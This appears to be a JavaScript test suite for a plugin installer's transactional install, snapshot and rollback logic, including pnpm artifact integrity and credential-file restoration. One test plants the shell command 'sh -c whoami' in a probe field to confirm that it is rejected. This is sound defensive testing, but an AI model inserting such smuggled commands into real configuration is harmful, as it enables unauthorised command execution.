  const verified = validatePnpmRuntimeArtifact(artifact, authority);
  assert.equal(verified.entries.length, 449);
  assert.equal(pnpmRuntimeClosureSha512(verified.entries), authority.closure.sha512);
  const poisoned = Buffer.from(artifact);
  poisoned[Math.floor(poisoned.length / 2)] ^= 0x01;
  assert.throws(
    () => validatePnpmRuntimeArtifact(poisoned, authority),
    /artifact bytes, SHA-256, or dist\.integrity mismatch/
  );
  const extra = [...verified.entries, {
    name: 'package/undeclared.js',
    type: '0',
    mode: 0o644,
    size: 1,
    body: Buffer.from('x'),
  }];
  assert.notEqual(pnpmRuntimeClosureSha512(extra), authority.closure.sha512);
  const rewrittenAuthority = structuredClone(authority);
  rewrittenAuthority.source.artifactSha256 = '0'.repeat(64);
  assert.throws(
    () => validatePnpmRuntimeAuthority(rewrittenAuthority),
    /authority is malformed/u
  );
});

test('private pnpm binding fixes Windows PATHEXT and rejects unsupported platforms', async () => {
  assert.equal(requiresPnpmCommandShimShell('darwin'), false);
  assert.equal(requiresPnpmCommandShimShell('linux'), false);
  assert.equal(requiresPnpmCommandShimShell('win32'), true);
  assert.equal(pnpmCommandShimShell({}, 'linux'), false);
  assert.equal(
    pnpmCommandShimShell({ COMSPEC: 'C:\\Windows\\System32\\cmd.exe' }, 'win32'),
    'C:\\Windows\\System32\\cmd.exe'
  );
  assert.throws(
    () => pnpmCommandShimShell({ COMSPEC: '\\system\\cmd.exe' }, 'win32'),
    /absolute/
  );
  assert.throws(() => pnpmCommandShimShell({ COMSPEC: 'cmd.exe' }, 'win32'), /absolute/);
  assert.throws(() => requiresPnpmCommandShimShell('freebsd'), /unsupported on freebsd/);
  assert.equal(validatePrivatePnpmPathext('.CMD;.EXE;.COM;.BAT'), '.CMD;.EXE;.COM;.BAT');
  assert.throws(
    () => validatePrivatePnpmPathext('.EXE;.CMD;.COM;.BAT'),
    /put \.CMD before/
  );
  assert.throws(() => validatePrivatePnpmPathext('.EXE;.COM;.BAT'), /put \.CMD before/);
});

test('effective policy verification executes the platform pnpm shim with only fixed keys', async (t) => {
  const root = await realpath(await workspace(t));
  const sourceBin = join(root, 'policy-bin');
  await mkdir(sourceBin);
  const commandName = process.platform === 'win32' ? 'pnpm.cmd' : 'pnpm';
  const source = join(sourceBin, commandName);
  const sourceText = process.platform === 'win32'
    ? [
        '@echo off',
        'if "%~6"=="allowBuilds" (echo {"@example/plugin":true} & exit /b 0)',
        'if "%~6"=="dangerouslyAllowAllBuilds" (echo false & exit /b 0)',
        'if "%~6"=="strictDepBuilds" (echo true & exit /b 0)',
        'exit /b 2',
        '',
      ].join('\r\n')
    : [
        '#!/bin/sh',
        'case "$6" in',
        "  allowBuilds) printf '%s\\n' '{\"@example/plugin\":true}' ;;",
        "  dangerouslyAllowAllBuilds) printf '%s\\n' 'false' ;;",
        "  strictDepBuilds) printf '%s\\n' 'true' ;;",
        '  *) exit 2 ;;',
        'esac',
        '',
      ].join('\n');
  await writeFile(source, sourceText, { mode: 0o700 });
  const environment = {
    PATH: sourceBin,
    PATHEXT: '.COM;.EXE;.BAT;.CMD',
    COMSPEC: process.env.COMSPEC,
    SystemRoot: process.env.SystemRoot,
    WINDIR: process.env.WINDIR,
  };
  assert.deepEqual(
    verifyEffectivePnpmBuildPolicy(root, ['@example/plugin'], true, { environment }),
    {
      allowBuilds: { '@example/plugin': true },
      dangerouslyAllowAllBuilds: false,
      strictDepBuilds: true,
    }
  );
});

test('authority-bound runtime acceptance commits only after dump, inventory, and restart evidence agree', async () => {
  const first = hostedFixture({ id: 3006, slug: 'accept-one', name: 'dsh-accept-one' }).item;
  const second = hostedFixture({ id: 3052, slug: 'accept-two', name: 'dsh-accept-two' }).item;
  const baselineInventory = { 'existing-plugin': '0.9.0' };
  const expectedInventory = {
    'dsh-accept-one': '1.0.0',
    'dsh-accept-two': '1.0.0',
    'existing-plugin': '0.9.0',
  };
  const dumpConfigOutput = [
    '- id: existing',
    '  name: existing-plugin',
    '- id: fixture-3006',
    '  name: dsh-accept-one',
    '  config:',
    '    credential: never-retain-this-value',
    '- id: fixture-3052',
    '  name: dsh-accept-two',
    '',
  ].join('\n');
  assert.deepEqual(parseDumpConfigEntries(dumpConfigOutput), [
    { id: 'existing', name: 'existing-plugin', disabled: false },
    { id: 'fixture-3006', name: 'dsh-accept-one', disabled: false },
    { id: 'fixture-3052', name: 'dsh-accept-two', disabled: false },
  ]);
  let rollbackCalls = 0;
  const result = await runAtomicAcceptanceBoundary(async () => {
    const evidence = verifyRuntimeAcceptanceEvidence([first, second], {
      baselineInventory,
      dumpConfigOutput,
      installedInventory: expectedInventory,
      restartedInventory: expectedInventory,
    });
    return { state: { status: 'committed', runtimeAcceptance: evidence } };
  }, async () => {
    rollbackCalls += 1;
    return completeRollback();
  });
  assert.equal(result.state.status, 'committed');
  assert.equal(result.state.runtimeAcceptance.accepted.length, 2);
  assert.equal(result.state.runtimeAcceptance.dumpConfigVerified, true);
  assert.doesNotMatch(JSON.stringify(result.state), /never-retain-this-value/);
  assert.equal(rollbackCalls, 0);
});

test('post-snapshot failure is complete after all eight governed files are restored before a baseline exists', async () => {
  await assert.rejects(
    () => runAtomicAcceptanceBoundary(
      async () => {
        throw new Error('simulated baseline inventory probe failure');
      },
      async () => ({
        attempted: true,
        baselineAvailable: false,
        filesRestored: true,
        managedFilesVerified: 8,
      })
    ),
    (error) => {
      assert.match(error.message, /baseline inventory probe failure; atomic rollback completed/);
      assert.equal(error.details.baselineAvailable, false);
      assert.equal(error.details.managedFilesVerified, 8);
      return true;
    }
  );

  await assert.rejects(
    () => runAtomicAcceptanceBoundary(
      async () => {
        throw new Error('simulated incomplete snapshot restore');
      },
      async () => ({
        attempted: true,
        baselineAvailable: false,
        filesRestored: true,
        managedFilesVerified: 7,
      })
    ),
    /rollback is incomplete/
  );

  await assert.rejects(
    () => runAtomicAcceptanceBoundary(
      async () => {
        throw new Error('simulated dependency restoration failure');
      },
      async () => ({
        attempted: true,
        baselineAvailable: false,
        filesRestored: true,
        managedFilesVerified: 8,
        dependencyClosureMutationStarted: true,
      })
    ),
    (error) => {
      assert.match(error.message, /dependency restoration failure; rollback is incomplete/);
      assert.equal(error.details.dependencyClosureMutationStarted, true);
      return true;
    }
  );
});

test('authority-bound functional probe failure restores the whole batch with no partial success', async () => {
  const first = hostedFixture({ id: 3006, slug: 'rollback-one', name: 'dsh-rollback-one' }).item;
  const second = hostedFixture({ id: 3052, slug: 'rollback-two', name: 'dsh-rollback-two' }).item;
  const simulatedProfile = [];
  let rollbackCalls = 0;
  await assert.rejects(
    () => runAtomicAcceptanceBoundary(async () => {
      simulatedProfile.push(first.package.name, second.package.name);
      return verifyRuntimeAcceptanceEvidence([first, second], {
        baselineInventory: {},
        dumpConfigOutput: [
          '- id: fixture-3006',
          '  name: dsh-rollback-one',
          '- id: fixture-3052',
          '  name: wrong-package',
          '',
        ].join('\n'),
        installedInventory: {
          'dsh-rollback-one': '1.0.0',
          'dsh-rollback-two': '1.0.0',
        },
        restartedInventory: {
          'dsh-rollback-one': '1.0.0',
          'dsh-rollback-two': '1.0.0',
        },
      });
    }, async () => {
      rollbackCalls += 1;
      simulatedProfile.length = 0;
      return completeRollback();
    }),
    /authority-bound functional entry probe failed; atomic rollback completed/
  );
  assert.deepEqual(simulatedProfile, []);
  assert.equal(rollbackCalls, 1);
});

test('cold-start failure enters the same complete rollback boundary', async () => {
  const simulatedProfile = ['dsh-cold-start-fixture'];
  let rollbackCalls = 0;
  await assert.rejects(
    () => runAtomicAcceptanceBoundary(async () => {
      throw new Error('cold Web probe did not expose the expected unauthenticated 401 boundary');
    }, async () => {
      rollbackCalls += 1;
      simulatedProfile.length = 0;
      return completeRollback();
    }),
    /cold Web probe.*atomic rollback completed/
  );
  assert.deepEqual(simulatedProfile, []);
  assert.equal(rollbackCalls, 1);
});

test('missing or executable runtime probe authority is rejected and rolled back', async () => {
  const item = hostedFixture({ id: 3006, slug: 'missing-probe', name: 'dsh-missing-probe' }).item;
  delete item.runtimeAcceptance;
  assert.throws(() => validateItem(item), /runtimeAcceptance/i);
  let rollbackCalls = 0;
  await assert.rejects(
    () => runAtomicAcceptanceBoundary(async () => verifyRuntimeAcceptanceEvidence([item], {
      baselineInventory: {},
      dumpConfigOutput: '- id: fixture-3006\n  name: dsh-missing-probe\n',
      installedInventory: { 'dsh-missing-probe': '1.0.0' },
      restartedInventory: { 'dsh-missing-probe': '1.0.0' },
    }), async () => {
      rollbackCalls += 1;
      return completeRollback();
    }),
    /runtime acceptance authority is malformed.*atomic rollback completed/
  );
  assert.equal(rollbackCalls, 1);

  const injected = hostedFixture({ id: 3007, slug: 'injected-probe', name: 'dsh-injected-probe' }).item;
  injected.runtimeAcceptance.functionalProbe.command = 'sh -c whoami';
  assert.throws(() => validateItem(injected), /runtimeAcceptance|functionalProbe|keys/i);
  assert.throws(
    () => verifyRuntimeAcceptanceEvidence([injected], {
      baselineInventory: {},
      dumpConfigOutput: '- id: fixture-3007\n  name: dsh-injected-probe\n',
      installedInventory: { 'dsh-injected-probe': '1.0.0' },
      restartedInventory: { 'dsh-injected-probe': '1.0.0' },
    }),
    /unsupported executable fields/
  );
});

test('snapshot v3 restores bytes, existence, and POSIX modes without leaking private state', async (t) => {
  const root = await realpath(await workspace(t));
  const dshHome = join(root, 'dsh-home');
  const profile = join(dshHome, 'profiles', 'web');
  const snapshot = join(root, 'snapshot');
  await mkdir(profile, { recursive: true });
  const baselineManifest = {
    name: 'dsh-profile-web',
    private: true,
    dependencies: {},
    dsh: {
      profile: {
        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
        patchReload: 'live',
      },
    },
  };
  await writeFile(join(profile, 'package.json'), `${JSON.stringify(baselineManifest, null, 2)}\n`, { mode: 0o640 });
  await writeFile(join(profile, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n', { mode: 0o600 });
  await writeFile(
    join(profile, 'pnpm-workspace.yaml'),
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n',
    { mode: 0o644 }
  );
  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n', { mode: 0o640 });
  const baselineSettings = 'telemetry: false\nprivate-setting: settings-secret-never-print\n';
  const baselineHomePatch = '- id: home-root\n  name: safe-root-patch\n';
  const baselineCredentials = 'provider:\n  token: credential-secret-never-print\n';
  await writeFile(join(dshHome, 'settings.yaml'), baselineSettings, { mode: 0o600 });
  await writeFile(join(dshHome, 'cordis.patch.yml'), baselineHomePatch, { mode: 0o640 });
  await writeFile(join(dshHome, '.credentials.yaml'), baselineCredentials, { mode: 0o600 });
  const baselineClosure = await captureProfileClosure(profile);
  const created = await createProfileSnapshot(dshHome, profile, snapshot);
  const liveManagedBytes = await captureManagedFileBindingInput(dshHome, profile);
  const snapshotManagedBytes = await captureSnapshotManagedFileBindingInput(snapshot);
  assert.deepEqual(snapshotManagedBytes, liveManagedBytes);
  liveManagedBytes.fill(0);
  snapshotManagedBytes.fill(0);
  const publicResult = JSON.stringify(created);
  assert.doesNotMatch(publicResult, /settings-secret-never-print|credential-secret-never-print/);
  assert.doesNotMatch(publicResult, new RegExp(sha256(Buffer.from(baselineCredentials))));
  assert.equal(Object.hasOwn(created, 'manifest'), false);

  const snapshotManifest = JSON.parse(await readFile(join(snapshot, 'snapshot.json'), 'utf8'));
  assert.equal(snapshotManifest.schemaVersion, 3);
  assert.deepEqual(
    snapshotManifest.files.map(({ root: fileRoot, path, present }) => ({ root: fileRoot, path, present })),
    [
      { root: 'profile', path: 'package.json', present: true },
      { root: 'profile', path: 'pnpm-lock.yaml', present: true },
      { root: 'profile', path: 'pnpm-workspace.yaml', present: true },
      { root: 'profile', path: 'cordis.patch.yml', present: true },
      { root: 'home', path: 'settings.yaml', present: true },
      { root: 'home', path: 'cordis.patch.yml', present: true },
      { root: 'home', path: '.credentials.yaml', present: true },
      { root: 'home', path: '.anonymous-user-id', present: false },
    ]
  );
  assert.equal(await readFile(join(snapshot, 'home', '.credentials.yaml'), 'utf8'), baselineCredentials);
  if (process.platform !== 'win32') {
    assert.deepEqual(
      snapshotManifest.files.map(({ posixMode }) => posixMode),
      [0o640, 0o600, 0o644, 0o640, 0o600, 0o640, 0o600, null]
    );
  }

  const loadedSnapshot = await loadVerifiedProfileSnapshot(snapshot);
  const cachedCredentials = loadedSnapshot.verifiedFiles.get('home/.credentials.yaml');
  const snapshotCredentialPath = join(snapshot, 'home', '.credentials.yaml');
  const retainedSnapshotCredentialPath = join(snapshot, 'home', '.credentials.retained.yaml');
  await rename(snapshotCredentialPath, retainedSnapshotCredentialPath);
  await writeFile(snapshotCredentialPath, 'provider:\n  token: replaced-snapshot\n', { mode: 0o600 });
  assert.equal(cachedCredentials.toString('utf8'), baselineCredentials);
  await assert.rejects(
    () => loadVerifiedProfileSnapshot(snapshot),
    /snapshot file home\/\.credentials\.yaml digest mismatch/
  );
  await rm(snapshotCredentialPath);
  await rename(retainedSnapshotCredentialPath, snapshotCredentialPath);

  await writeFile(join(profile, 'package.json'), '{"broken":true}\n');
  await writeFile(join(profile, 'pnpm-lock.yaml'), 'lockfileVersion: broken\n');
  await writeFile(join(profile, 'pnpm-workspace.yaml'), 'packages: []\n');
  await writeFile(join(profile, 'cordis.patch.yml'), '- broken: true\n');
  await writeFile(join(dshHome, 'settings.yaml'), 'mutated: true\n');
  await writeFile(join(dshHome, 'cordis.patch.yml'), '- mutated: true\n');
  await writeFile(join(dshHome, '.credentials.yaml'), 'stolen: no\n');
  await writeFile(join(dshHome, '.anonymous-user-id'), 'created-during-transaction\n');
  if (process.platform !== 'win32') {
    await chmod(join(profile, 'package.json'), 0o600);
    await chmod(join(dshHome, 'cordis.patch.yml'), 0o600);
  }
  assert.equal((await verifyProfileSnapshot(dshHome, profile, snapshot)).matches, false);
  await restoreProfileSnapshot(dshHome, profile, snapshot);
  assert.deepEqual(
    JSON.parse(await readFile(join(profile, 'package.json'), 'utf8')),
    baselineManifest
  );
  assert.equal(await readFile(join(profile, 'pnpm-lock.yaml'), 'utf8'), 'lockfileVersion: 9.0\n');
  assert.equal(
    await readFile(join(profile, 'pnpm-workspace.yaml'), 'utf8'),
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
  );
  assert.equal(await readFile(join(profile, 'cordis.patch.yml'), 'utf8'), '[]\n');
  assert.equal(await readFile(join(dshHome, 'settings.yaml'), 'utf8'), baselineSettings);
  assert.equal(await readFile(join(dshHome, 'cordis.patch.yml'), 'utf8'), baselineHomePatch);
  assert.equal(await readFile(join(dshHome, '.credentials.yaml'), 'utf8'), baselineCredentials);
  if (process.platform !== 'win32') {
    assert.equal((await lstat(join(profile, 'package.json'))).mode & 0o7777, 0o640);
    assert.equal((await lstat(join(profile, 'pnpm-lock.yaml'))).mode & 0o7777, 0o600);
    assert.equal((await lstat(join(profile, 'pnpm-workspace.yaml'))).mode & 0o7777, 0o644);
    assert.equal((await lstat(join(profile, 'cordis.patch.yml'))).mode & 0o7777, 0o640);
    assert.equal((await lstat(join(dshHome, 'settings.yaml'))).mode & 0o7777, 0o600);
    assert.equal((await lstat(join(dshHome, 'cordis.patch.yml'))).mode & 0o7777, 0o640);
    assert.equal((await lstat(join(dshHome, '.credentials.yaml'))).mode & 0o7777, 0o600);
  }
  await assert.rejects(() => lstat(join(dshHome, '.anonymous-user-id')), { code: 'ENOENT' });
  assert.deepEqual(await verifyProfileSnapshot(dshHome, profile, snapshot), {
    snapshot,
    schemaVersion: 3,
    profile: 'web',
    filesProtected: 8,
    matches: true,
    mismatches: [],
  });

  const packageAlias = join(root, 'profile-package-hardlink.json');
  await link(join(profile, 'package.json'), packageAlias);
  await assert.rejects(
    () => captureManagedFileBindingInput(dshHome, profile),
    /regular single-link file/
  );
  await rm(packageAlias);

  const alternateHome = join(root, 'alternate-home');
  await mkdir(join(alternateHome, 'profiles'), { recursive: true });
  await assert.rejects(
    () => verifyProfileSnapshot(alternateHome, profile, snapshot),
    /exactly DSH_HOME\/profiles\/web/
  );

  const rogue = join(profile, 'node_modules', 'rogue');
  await mkdir(rogue, { recursive: true });
  await writeFile(join(rogue, 'package.json'), '{"name":"rogue","version":"9.9.9"}\n');
  assert.equal((await verifyProfileClosure(profile, baselineClosure)).matches, false);
  await rm(join(profile, 'node_modules'), { recursive: true, force: true });
  assert.equal((await verifyProfileClosure(profile, baselineClosure)).matches, true);
});

test('Plugin Skill keeps Top10 and all 80 entries fail closed without receipts', async () => {
  const skill = await readFile('skills/dsh-plugin-installer/SKILL.md', 'utf8');
  const transaction = await readFile(
    'skills/dsh-plugin-installer/scripts/install-transaction.mjs',
    'utf8'
  );
  assert.match(skill, /80 curated Plugin records/);
  assert.match(skill, /zero verified installation\s+items/);
  assert.match(skill, /Top10 is not frozen and cannot start a transaction/);
  assert.match(skill, /npm-package-version/);
  assert.match(skill, /github-release-asset/);
  assert.match(skill, /git-commit/);
  assert.match(skill, /fixed argument array, `shell: false`, `--` option termination/);
  assert.match(skill, /no caller-PATH pnpm, Corepack implementation/);
  assert.match(skill, /writes `state\.json` with `status: "committed"` only after/);
  assert.match(skill, /failed single item or Top10 member restores the entire retained/);
  assert.match(skill, /current-user SID-only/);
  assert.match(skill, /exclusive `DSH_HOME` transaction lock/);
  assert.match(skill, /fresh private 32-byte nonce/);
  assert.match(skill, /all eight governed file states are still\n+   restored and verified/);
  assert.match(transaction, /function buildChildEnvironment/);
  assert.doesNotMatch(
    transaction,
    /snapshotManifestSha256|rollbackBaselineSha256|terminalClosureSha256|terminalInventorySha256/
  );
  assert.match(transaction, /retainTakeoverGuard = true[\s\S]+takeover guard was retained/u);
  assert.match(
    transaction,
    /finally \{\s*if \(!retainTakeoverGuard\) await releaseTakeoverGuard\(guard\)/u
  );
  const installExecutor = transaction.slice(
    transaction.indexOf('export async function executeTransaction'),
    transaction.indexOf('export async function executeRemovalTransaction')
  );
  const recoveryExecutor = transaction.slice(
    transaction.indexOf('export async function executeRecoveryTransaction')
  );
  assert.doesNotMatch(
    installExecutor,
    /\blockedSource\b|verifyTerminalSnapshotManagedFilesBinding/
  );
  assert.match(
    recoveryExecutor,
    /await createProfileSnapshot[\s\S]+await verifyTerminalSnapshotManagedFilesBinding[\s\S]+await restoreAndVerifyBaseline/
  );
  assert.doesNotMatch(transaction, /env:\s*\{\s*\.\.\.process\.env/);
  assert.doesNotMatch(skill, /awaiting-runtime-acceptance/);
});
